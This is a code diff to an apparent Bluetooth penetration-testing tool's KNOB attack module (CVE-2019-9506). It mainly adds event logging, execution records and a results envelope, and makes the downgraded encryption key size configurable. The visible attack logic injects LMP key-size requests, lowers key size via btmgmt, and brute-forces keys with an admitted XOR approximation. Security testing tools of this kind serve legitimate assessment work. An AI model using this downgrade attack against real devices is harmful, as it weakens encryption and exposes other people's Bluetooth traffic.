@@ -39,6 +39,11 @@ import time
 
 from blue_tap.utils.bt_helpers import normalize_mac, run_cmd
 from blue_tap.utils.output import info, success, warning
+from blue_tap.core.result_schema import (
+    EXECUTION_COMPLETED, EXECUTION_FAILED, EXECUTION_ERROR, EXECUTION_SKIPPED,
+    build_run_envelope, make_execution, make_evidence, make_run_id, now_iso,
+)
+from blue_tap.core.cli_events import emit_cli_event
 
 
 # HCI command constants for encryption key size operations
@@ -64,6 +69,18 @@ class KNOBAttack:
         self.hci = hci
         self._results: dict = {}
         self._darkfirmware_available: bool | None = None
+        self.run_id = make_run_id("knob")
+        self._started_at = now_iso()
+        self._cli_events: list[dict] = []
+        self._executions: list[dict] = []
+
+    def _emit(self, event_type: str, message: str, **details):
+        evt = emit_cli_event(
+            event_type=event_type, module="attack", run_id=self.run_id,
+            target=self.target, adapter=self.hci, message=message,
+            details=details,
+        )
+        self._cli_events.append(evt)
 
     def _check_darkfirmware(self) -> bool:
         """Check if DarkFirmware is available for LMP-level key size manipulation."""
@@ -158,6 +175,8 @@ class KNOBAttack:
         Returns:
             dict with bt_version, likely_vulnerable, min_key_size_observed, details
         """
+        phase_start = now_iso()
+        self._emit("phase_started", "KNOB probe: checking vulnerability")
         info(f"KNOB probe: checking {self.target}")
         result = {
             "bt_version": None,
@@ -245,9 +264,25 @@ class KNOBAttack:
             info("DarkFirmware not found; btmgmt fallback will be used")
 
         self._results["probe"] = result
+        self._executions.append(make_execution(
+            kind="check", id="knob_probe", title="KNOB Vulnerability Probe (CVE-2019-9506)",
+            module="attack", protocol="BR/EDR",
+            execution_status=EXECUTION_COMPLETED,
+            module_outcome="confirmed" if result["likely_vulnerable"] else "not_applicable",
+            evidence=make_evidence(
+                summary=f"BT {result.get('bt_version', '?')}: {'likely vulnerable' if result['likely_vulnerable'] else 'not vulnerable'}",
+                confidence="high" if result["bt_version"] is not None else "low",
+                observations=result["details"],
+                module_evidence={"bt_version": result["bt_version"], "darkfirmware": result.get("darkfirmware_available")},
+            ),
+            started_at=phase_start, completed_at=now_iso(),
+            tags=["cve", "CVE-2019-9506", "knob"],
+            module_data=result,
+        ))
+        self._emit("execution_result", f"KNOB probe: {'vulnerable' if result['likely_vulnerable'] else 'not vulnerable'}")
         return result
 
-    def negotiate_min_key(self) -> dict:
+    def negotiate_min_key(self, requested_key_size: int = 1) -> dict:
         """Attempt to negotiate minimum encryption key size.
 
         Strategy:
@@ -258,9 +293,12 @@ class KNOBAttack:
         Returns:
             dict with requested_key_size, negotiated_key_size, success, method
         """
+        phase_start = now_iso()
+        self._emit("phase_started", "KNOB negotiate: requesting minimum key size")
         info(f"KNOB negotiate: requesting minimum key size with {self.target}")
+        requested_key_size = max(1, min(16, requested_key_size))
         result = {
-            "requested_key_size": 1,
+            "requested_key_size": requested_key_size,
             "negotiated_key_size": None,
             "success": False,
             "method": None,
@@ -272,7 +310,7 @@ class KNOBAttack:
         if df_available:
             result["method"] = "darkfirmware_lmp"
             info("Using DarkFirmware for LMP-level key size manipulation")
-            self._negotiate_via_darkfirmware(result)
+            self._negotiate_via_darkfirmware(result, requested_key_size=requested_key_size)
         else:
             result["method"] = "btmgmt_fallback"
             info("Using btmgmt to set local adapter minimum key size")
@@ -280,12 +318,43 @@ class KNOBAttack:
                 "btmgmt approach only sets LOCAL preference — full KNOB "
                 "requires baseband MitM to rewrite LMP messages in flight"
             )
-            self._negotiate_via_btmgmt(result)
+            self._negotiate_via_btmgmt(result, requested_key_size=requested_key_size)
 
         self._results["negotiate"] = result
+        negotiated_size = result.get("negotiated_key_size")
+        negotiated_summary = (
+            f"Key size {negotiated_size} byte(s) via {result.get('method', 'unknown')}"
+            if negotiated_size is not None
+            else f"Negotiation via {result.get('method', 'unknown')} — key size not confirmed"
+        )
+        self._executions.append(make_execution(
+            kind="check", id="knob_negotiate", title="KNOB Minimum Key Size Negotiation",
+            module="attack", protocol="BR/EDR",
+            execution_status=EXECUTION_COMPLETED,
+            module_outcome="success" if result["success"] else "failed",
+            evidence=make_evidence(
+                summary=negotiated_summary,
+                confidence="high" if negotiated_size is not None else "low",
+                observations=result["details"],
+                module_evidence={
+                    "requested_key_size": result["requested_key_size"],
+                    "negotiated_key_size": negotiated_size,
+                    "method": result.get("method"),
+                },
+            ),
+            started_at=phase_start, completed_at=now_iso(),
+            tags=["cve", "CVE-2019-9506", "knob", "encryption"],
+            module_data=result,
+        ))
+        self._emit("execution_result", f"KNOB negotiate: {'success' if result['success'] else 'failed'}")
         return result
 
-    def _negotiate_via_darkfirmware(self, result: dict, max_rounds: int = 10) -> None:
+    def _negotiate_via_darkfirmware(
+        self,
+        result: dict,
+        requested_key_size: int = 1,
+        max_rounds: int = 10,
+    ) -> None:
         """Negotiate minimum encryption key size via DarkFirmware LMP injection.
 
         Sends LMP_encryption_key_size_req with key_size=1 directly at the LMP
@@ -309,13 +378,22 @@ class KNOBAttack:
                 lmp_responses: list[dict] = []
                 vsc.start_lmp_monitor(lambda evt: lmp_responses.append(evt))
 
-                # Initial KNOB: key_size = 1 byte
-                info("[KNOB] Step 1: Sending LMP_encryption_key_size_req(key_size=1) via DarkFirmware")
-                payload = knob_template()
+                info(
+                    "[KNOB] Step 1: Sending "
+                    f"LMP_encryption_key_size_req(key_size={requested_key_size}) "
+                    "via DarkFirmware"
+                )
+                payload = knob_template() if requested_key_size == 1 else build_enc_key_size_req(
+                    key_size=requested_key_size
+                )
                 ok = vsc.send_lmp(payload)
 
                 if ok:
-                    result["details"].append("Sent LMP_encryption_key_size_req(key_size=1) via DarkFirmware")
+                    result["details"].append(
+                        "Sent "
+                        f"LMP_encryption_key_size_req(key_size={requested_key_size}) "
+                        "via DarkFirmware"
+                    )
                 else:
                     result["details"].append("Failed to send LMP via DarkFirmware")
                     return
@@ -342,15 +420,18 @@ class KNOBAttack:
                             pdu_opcode = payload_bytes[0] & 0x7F
                             if pdu_opcode == LMP_ENCRYPTION_KEY_SIZE_REQ:
                                 target_proposed = payload_bytes[1]
-                                info(f"[KNOB] Round {round_num}: target proposed key_size={target_proposed}, "
-                                     f"countering with 1")
+                                info(
+                                    f"[KNOB] Round {round_num}: target proposed "
+                                    f"key_size={target_proposed}, countering with "
+                                    f"{requested_key_size}"
+                                )
                                 result["details"].append(
                                     f"Round {round_num}: target proposed key_size={target_proposed}"
                                 )
 
                     if target_proposed is not None:
-                        if target_proposed <= 1:
-                            # Target accepted key_size=1
+                        if target_proposed <= requested_key_size:
+                            # Target accepted the requested size or better
                             final_key_size = target_proposed
                             info(f"[KNOB] Round {round_num}: target accepted key_size={target_proposed}")
                             result["negotiated_key_size"] = target_proposed
@@ -358,11 +439,11 @@ class KNOBAttack:
                             success(f"[KNOB] Key size negotiated to {target_proposed} byte(s)")
                             break
                         else:
-                            # Target proposed larger — counter with 1 again
-                            counter_pkt = build_enc_key_size_req(key_size=1)
+                            # Target proposed larger — counter with requested size again
+                            counter_pkt = build_enc_key_size_req(key_size=requested_key_size)
                             vsc.send_lmp(counter_pkt)
                             result["details"].append(
-                                f"Round {round_num}: countered with key_size=1"
+                                f"Round {round_num}: countered with key_size={requested_key_size}"
                             )
                     else:
                         # No key size response in this round
@@ -415,7 +496,7 @@ class KNOBAttack:
         except Exception as exc:
             result["details"].append(f"DarkFirmware negotiation error: {exc}")
 
-    def _negotiate_via_btmgmt(self, result: dict) -> None:
+    def _negotiate_via_btmgmt(self, result: dict, requested_key_size: int = 1) -> None:
         """Negotiate min key size via btmgmt (software-only fallback).
 
         Sets the local adapter's minimum encryption key size to 1 via btmgmt,
@@ -423,28 +504,33 @@ class KNOBAttack:
         preference — full KNOB requires MitM at baseband.
         """
         # Step 1: Set minimum encryption key size on local adapter
-        info("Setting local adapter minimum encryption key size to 1 via btmgmt...")
+        info(
+            "Setting local adapter minimum encryption key size to "
+            f"{requested_key_size} via btmgmt..."
+        )
         adapter_index = self.hci.replace("hci", "")
 
         set_result = run_cmd(
             ["btmgmt", "--index", adapter_index,
-             "setting", "min-enc-key-size", "1"],
+             "setting", "min-enc-key-size", str(requested_key_size)],
             timeout=10,
         )
         if set_result.returncode == 0:
-            info("btmgmt min key size set to 1")
-            result["details"].append("Local adapter min key size set to 1 via btmgmt")
+            info(f"btmgmt min key size set to {requested_key_size}")
+            result["details"].append(
+                f"Local adapter min key size set to {requested_key_size} via btmgmt"
+            )
         else:
             # Try alternative btmgmt syntax
             set_result2 = run_cmd(
                 ["btmgmt", "--index", adapter_index,
-                 "min-enc-key-size", "1"],
+                 "min-enc-key-size", str(requested_key_size)],
                 timeout=10,
             )
             if set_result2.returncode == 0:
-                info("btmgmt min key size set to 1 (alt syntax)")
+                info(f"btmgmt min key size set to {requested_key_size} (alt syntax)")
                 result["details"].append(
-                    "Local adapter min key size set to 1 via btmgmt (alt syntax)"
+                    f"Local adapter min key size set to {requested_key_size} via btmgmt (alt syntax)"
                 )
             else:
                 warning(
@@ -541,6 +627,8 @@ class KNOBAttack:
         """
         from blue_tap.utils.output import get_progress
 
+        phase_start = now_iso()
+        self._emit("phase_started", "KNOB brute-force: attempting key recovery")
         info(f"KNOB brute-force: key_size={key_size} byte(s)")
         key_size_bits = key_size * 8
         total_candidates = 2 ** key_size_bits
@@ -564,6 +652,24 @@ class KNOBAttack:
             result["details"].append(
                 f"{total_candidates:,} candidates exceeds practical brute-force scope"
             )
+            self._results["brute_force"] = result
+            self._executions.append(make_execution(
+                kind="check", id="knob_brute_force", title="KNOB Encryption Key Brute-Force",
+                module="attack", protocol="BR/EDR",
+                execution_status=EXECUTION_SKIPPED,
+                module_outcome="not_applicable",
+                evidence=make_evidence(
+                    summary=f"Key size {key_size} bytes ({key_size_bits} bits) exceeds practical brute-force scope",
+                    confidence="high",
+                    observations=result["details"],
+                    module_evidence={"key_size_bytes": key_size, "total_candidates": total_candidates},
+                ),
+                started_at=phase_start, completed_at=now_iso(),
+                tags=["cve", "CVE-2019-9506", "knob", "brute-force"],
+                module_data=result,
+                destructive=False,
+            ))
+            self._emit("execution_result", f"KNOB brute-force: skipped (key size {key_size} bytes too large)")
             return result
 
         # If no captured data provided, try to capture from active connection
@@ -597,6 +703,9 @@ class KNOBAttack:
                 key_bytes = candidate.to_bytes(key_size, byteorder="big")
 
                 if has_acl:
+                    # TODO: Replace this repeating-XOR heuristic with true
+                    # BR/EDR E0 keystream generation once EN_RAND/BD_ADDR/CLK
+                    # capture is wired into the sniffer path.
                     # E0 stream cipher approximation: XOR key stream with data
                     # Real E0 uses LFSR-based stream generation seeded from
                     # the encryption key + EN_RAND + BD_ADDR. Here we test
@@ -658,6 +767,33 @@ class KNOBAttack:
                 )
 
         self._results["brute_force"] = result
+        bf_summary = (
+            f"Key found: 0x{result['key_hex']} in {result['time_elapsed']}s"
+            if result["key_found"]
+            else f"No key found after {total_candidates:,} candidates in {result['time_elapsed']}s"
+        )
+        self._executions.append(make_execution(
+            kind="check", id="knob_brute_force", title="KNOB Encryption Key Brute-Force",
+            module="attack", protocol="BR/EDR",
+            execution_status=EXECUTION_COMPLETED,
+            module_outcome="success" if result["key_found"] else "not_found",
+            evidence=make_evidence(
+                summary=bf_summary,
+                confidence="high" if result["key_found"] else "medium",
+                observations=result["details"],
+                module_evidence={
+                    "key_size_bytes": key_size,
+                    "key_hex": result.get("key_hex"),
+                    "total_candidates": total_candidates,
+                    "time_elapsed": result["time_elapsed"],
+                },
+            ),
+            started_at=phase_start, completed_at=now_iso(),
+            tags=["cve", "CVE-2019-9506", "knob", "brute-force"],
+            module_data=result,
+            destructive=False,
+        ))
+        self._emit("execution_result", f"KNOB brute-force: {'key found' if result['key_found'] else 'no key found'}")
         return result
 
     def _try_capture_acl_sample(self) -> bytes | None:
@@ -766,16 +902,19 @@ class KNOBAttack:
 
         return None
 
-    def execute(self) -> dict:
+    def execute(self, key_size: int = 1) -> dict:
         """Full KNOB attack chain: probe, negotiate, brute-force.
 
         Returns comprehensive results dict with all phases.
         """
+        self._emit("run_started", f"KNOB attack (CVE-2019-9506) against {self.target}")
         info(f"=== KNOB Attack (CVE-2019-9506) against {self.target} ===")
+        requested_key_size = max(1, min(16, key_size))
         results = {
             "target": self.target,
             "cve": "CVE-2019-9506",
             "attack": "KNOB",
+            "requested_key_size": requested_key_size,
             "phases": {},
         }
 
@@ -792,7 +931,7 @@ class KNOBAttack:
 
         # Phase 2: Negotiate minimum key
         info("--- Phase 2: Negotiate minimum key size ---")
-        negotiate_result = self.negotiate_min_key()
+        negotiate_result = self.negotiate_min_key(requested_key_size=requested_key_size)
         results["phases"]["negotiate"] = negotiate_result
 
         # Phase 3: Brute-force
@@ -806,14 +945,15 @@ class KNOBAttack:
                 f"--- Phase 3: Skipped (key size {negotiated_size} bytes "
                 f"too large for demonstrative brute-force) ---"
             )
-            results["phases"]["brute_force"] = {
-                "skipped": True,
-                "reason": f"Negotiated key size {negotiated_size} bytes "
-                          f"exceeds demonstrative brute-force scope",
-            }
+            # Call brute_force_key so it creates its own SKIPPED execution record
+            bf_result = self.brute_force_key(key_size=negotiated_size)
+            results["phases"]["brute_force"] = bf_result
         else:
-            info("--- Phase 3: Demonstrative brute-force (1-byte key) ---")
-            bf_result = self.brute_force_key(key_size=1)
+            info(
+                "--- Phase 3: Demonstrative brute-force "
+                f"({requested_key_size}-byte key) ---"
+            )
+            bf_result = self.brute_force_key(key_size=requested_key_size)
             results["phases"]["brute_force"] = bf_result
 
         # Overall assessment
@@ -830,7 +970,58 @@ class KNOBAttack:
             )
 
         self._results["execute"] = results
+        self._emit("run_completed", f"KNOB attack complete — success={results['overall_success']}")
+        results["_envelope"] = self.build_envelope()
         return results
+
+    def build_envelope(self) -> dict:
+        """Build standardized RunEnvelope v2 from collected execution data."""
+        probe = self._results.get("probe", {})
+        negotiate = self._results.get("negotiate", {})
+        bf = self._results.get("brute_force", {})
+        capability_limitations = []
+        if not probe.get("darkfirmware_available", False):
+            capability_limitations.append(
+                "DarkFirmware unavailable; negotiation uses btmgmt local preference rather than LMP message rewriting."
+            )
+        if negotiate.get("method") == "btmgmt_fallback":
+            capability_limitations.append(
+                "btmgmt fallback cannot perform full KNOB MitM rewriting on in-flight LMP traffic."
+            )
+        if bf.get("details") and any("enumeration only" in str(item).lower() for item in bf.get("details", [])):
+            capability_limitations.append(
+                "Brute-force phase ran without captured encrypted ACL data, so only key-space enumeration was possible."
+            )
+        if bf.get("details") and any("aes-ccm" in str(item).lower() for item in bf.get("details", [])):
+            capability_limitations.append(
+                "Current brute-force validation path does not recover Secure Connections AES-CCM traffic."
+            )
+        return build_run_envelope(
+            schema="blue_tap.attack.result",
+            module="attack",
+            target=self.target,
+            adapter=self.hci,
+            operator_context={"command": "knob", "cve": "CVE-2019-9506"},
+            summary={
+                "operation": "knob",
+                "cve": "CVE-2019-9506",
+                "likely_vulnerable": probe.get("likely_vulnerable", False),
+                "negotiation_success": negotiate.get("success", False),
+                "key_found": bf.get("key_found", False),
+                "method": negotiate.get("method", "unknown"),
+                "capability_limitations": capability_limitations,
+            },
+            executions=self._executions,
+            module_data={
+                "cli_events": self._cli_events,
+                "probe": probe,
+                "negotiate": negotiate,
+                "brute_force": bf,
+                "capability_limitations": capability_limitations,
+            },
+            started_at=self._started_at,
+            run_id=self.run_id,
+        )
 
     def get_results(self) -> dict:
         """Return all accumulated results from probe/negotiate/brute_force/execute."""
